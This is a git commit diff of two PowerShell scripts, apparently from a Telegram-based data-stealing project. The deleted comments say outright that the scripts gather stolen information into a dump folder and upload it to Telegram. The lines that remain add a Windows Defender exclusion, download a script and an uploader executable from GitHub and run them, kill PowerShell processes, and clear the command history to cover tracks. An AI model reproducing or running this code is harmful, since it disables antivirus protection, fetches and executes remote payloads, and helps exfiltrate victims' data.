94d72ee2b86878ff7b28d082d301f7e6fdb66943
PLESSY Franck <90218895+PFranck06@users.noreply.github.com>
2024-02-10 11:05:38 +0100

    Add files via upload

--- ciaoV2_upload.ps1
+++ ciaoV2_upload.ps1
@@ -1,19 +1,8 @@
 Set-Location C:\Users\Public\
-#Go to the folder in which we will download files
 Add-MpPreference -ExclusionExtension exe -Force 
-#Add exception for .exe files in antivirus
-mkdir dump
-#Create dump/ directory to put all informations that we'll steal in it
 Invoke-WebRequest https://raw.githubusercontent.com/PFranck06/HowardTelegram/main/fin_upload.ps1 -OutFile fin_upload.ps1 
-#Download final .ps1 file to delete all .txt files and stop all powershell process
 Invoke-WebRequest https://raw.githubusercontent.com/PFranck06/HowardTelegram/main/telegram_uploader.exe -OutFile telegram_uploader.exe 
-#Download uploader file to upload all informations on telegram
-Compress-Archive dump/ dump.zip 
-#Compress dump/ folder to upload it on telegram
-./telegram_uploader.exe -f dump.zip -c "Here are all informations !" 
-#Upload dump.zip on telegram
-./telegram_uploader.exe -f dump.zip -c "Hello World !" 
-#Hello World
+./telegram_uploader.exe -c "Hello World !" 
 Start-Sleep -Seconds 15 #Wait 15 seconds
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process 
 #Kill all powershell process except the one running
--- fin_upload.ps1
+++ fin_upload.ps1
@@ -1,16 +1,7 @@
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process 
-#Kill all powershell process except the one running
 Set-Location C:\Users\Public\
-#Go to public documents location
-#Delete all files downloaded before
-#Remove-Item -r dump/
-Remove-Item dump.zip
-Remove-Item fin_upload.ps1
+#Remove-Item fin_upload.ps1
 Set-ExecutionPolicy restricted -Force 
-#Reset script blocker
 Remove-MpPreference -ExclusionExtension ps1 -Force 
-#Reset antivirus exception
 Clear-Content (Get-PSReadlineOption).HistorySavePath 
-#Clear powershell command history
 taskkill -F /IM powershell.exe 
-#Kill all powershell process
